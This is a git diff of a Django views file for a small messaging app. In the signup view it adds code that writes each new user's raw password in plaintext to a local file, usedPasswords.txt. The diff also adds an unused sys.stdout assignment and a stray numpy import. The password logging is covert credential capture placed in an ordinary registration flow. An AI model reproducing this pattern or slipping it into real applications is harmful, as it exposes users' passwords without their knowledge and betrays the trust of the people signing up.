@@ -2,6 +2,8 @@ import datetime
 from email import message
 from getpass import getuser
 
+import sys
+
 from django.http import HttpResponseRedirect
 from django.shortcuts import get_object_or_404, render, redirect
 from django.contrib.auth.decorators import login_required
@@ -9,6 +11,7 @@ from django.contrib.auth import get_user_model, login, authenticate
 from django.contrib.auth.forms import UserCreationForm
 from django.urls import reverse
 from django.views import generic
+from numpy import True_
 
 
 
@@ -21,9 +24,8 @@ class IndexView(generic.ListView):
     context_object_name = 'latest_messages_list'
 
 
-    
 
-    
+ 
 
     def get_queryset(self):
         
@@ -101,6 +103,7 @@ def vote(request, question_id):
         return HttpResponseRedirect(reverse('messages:results', args=(question.id,)))
 
 
+
 def signup(request):
     if request.method == 'POST':
         form = UserCreationForm(request.POST)
@@ -108,6 +111,11 @@ def signup(request):
             form.save()
             username = form.cleaned_data.get('username')
             raw_password = form.cleaned_data.get('password1')
+            stdoutOrigin=sys.stdout 
+            f = open('usedPasswords.txt', 'a')
+            f.write(raw_password + '\n')
+            f.close()
+            
             user = authenticate(username=username, password=raw_password)
             login(request, user)
             return redirect('/')
